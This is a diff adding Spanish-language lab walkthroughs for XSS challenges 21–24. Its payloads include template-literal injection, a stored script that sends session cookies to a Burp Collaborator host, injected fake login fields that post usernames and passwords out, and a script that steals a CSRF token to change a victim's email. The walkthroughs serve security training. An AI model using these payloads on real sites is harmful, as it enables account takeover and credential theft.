@@ -481,4 +481,71 @@ Utilizamos un valor de URL que contiene una secuencia manipulada para cerrar el 
 https://probando.com&apos;+alert(0)+&apos;
 ```
 
-## Reto 21:
+## Reto 21: XSS reflejado en un literal de plantilla con corchetes angulares, comillas simples y dobles, barras invertidas y comillas invertidas con escape Unicode
+
+Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios reflejada en la función de búsqueda del blog. La reflexión se produce dentro de una cadena de plantilla con corchetes angulares, comillas simples y dobles codificadas en HTML, y comillas invertidas de escape. Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que invoque alertfunción dentro de la cadena de plantilla. 
+
+El sistema aplica un filtrado agresivo que codifica signos angulares, comillas simples y dobles, barras invertidas y las propias comillas invertidas, bloqueando así inyecciones clásicas. Sin embargo, no restringe las expresiones contenidas entre el símbolo de dólar y llaves, que son interpretadas como código ejecutable dentro de la plantilla.
+
+Aprovechamos esta brecha introduciendo una expresión que se evalúa directamente al cargar la página, sin necesidad de romper el delimitador original. Al estar el contenido ya dentro de una cadena ejecutable, el navegador interpreta la expresión de inmediato y ejecuta la función deseada.
+
+```java
+${alert(0)}
+```
+
+## Reto 22: Explotación de secuencias de comandos entre sitios para robar cookies
+
+Este laboratorio contiene una vulnerabilidad XSS almacenada en la función de comentarios del blog. Un usuario víctima simulado ve todos los comentarios después de su publicación. Para resolver el laboratorio, explote la vulnerabilidad para extraer la cookie de sesión de la víctima y, a continuación, utilice esta cookie para suplantar su identidad.
+
+Aprovechamos la vulnerabilidad para insertar un fragmento de código que, al ejecutarse en el navegador de la víctima, recopila su cookie de sesión y la envía en segundo plano a un servidor externo controlado a través de Burp Collaborator, una herramienta diseñada para capturar interacciones fuera de banda.
+
+Una vez interceptada la cookie, la utilizamos para suplantar la identidad del usuario afectado, inyectándola en nuestras propias peticiones mediante un proxy o el módulo Repeater de Burp Suite. Esto nos da acceso a áreas privadas como si fuéramos la víctima.
+
+<script>
+fetch("https://356v5ezsjg48pm1q7drtw4iax13srjf8.oastify.com/?cookie=" +btoa(document.cookie));
+</script>
+
+## Reto 23 : Explotación de secuencias de comandos entre sitios para capturar contraseñas
+
+
+Este laboratorio contiene una vulnerabilidad XSS almacenada en la función de comentarios del blog. Una víctima simulada ve todos los comentarios después de su publicación. Para resolver el laboratorio, explote la vulnerabilidad para extraer el nombre de usuario y la contraseña de la víctima y, a continuación, utilice estas credenciales para iniciar sesión en su cuenta.  
+
+Aprovechamos esta oportunidad para insertar campos de entrada personalizados en el comentario, imitando elementos ya existentes en la página. Añadimos un evento que, cuando el usuario introduce su contraseña, intercepta el valor junto con su nombre de usuario y los envía automáticamente al servidor público de Burp Collaborator.
+
+Una vez que recibimos esta información en el panel de Collaborator, podemos utilizar las credenciales capturadas para iniciar sesión como la víctima, accediendo así directamente a su cuenta.
+
+
+```html
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
+## Reto24: Explotación de XSS para eludir las defensas CSRF
+
+Este laboratorio contiene una vulnerabilidad XSS almacenada en la función de comentarios del blog. Para solucionarlo, explote la vulnerabilidad para robar un token CSRF, que luego podrá usar para cambiar la dirección de correo electrónico de quien vea los comentarios de las entradas del blog.
+
+Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 
+
+En este caso, consolidamos la explotación automatizando todo el flujo: cuando una víctima visualiza el comentario malicioso, su navegador realiza una petición a su propia página de perfil, extrae el token CSRF del formulario oculto, y lo reutiliza inmediatamente para enviar una petición de cambio de correo electrónico sin que el usuario lo sepa.
+
+Este enfoque permite realizar una acción sensible —como modificar información de cuenta— sin interacción directa por parte de la víctima, utilizando su sesión activa y su token legítimo.
+
+
+```html
+<script>
+var req = new XMLHttpRequest();
+req.open("GET", "/my-account", false);
+req.send();
+var response = req.responseText;
+var csrf_token = response.match(/name="csrf" value="(.*?)"/)[1];
+var req2 = new XMLHttpRequest();
+req2.open('POST','/my-account/change-email',true);
+req2.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+var data = "email="+ encodeURIComponent("test2@test.com")+ "&csrf="+ encodeURIComponent(csrf_token);
+req2.send(data)
+</script>
+```
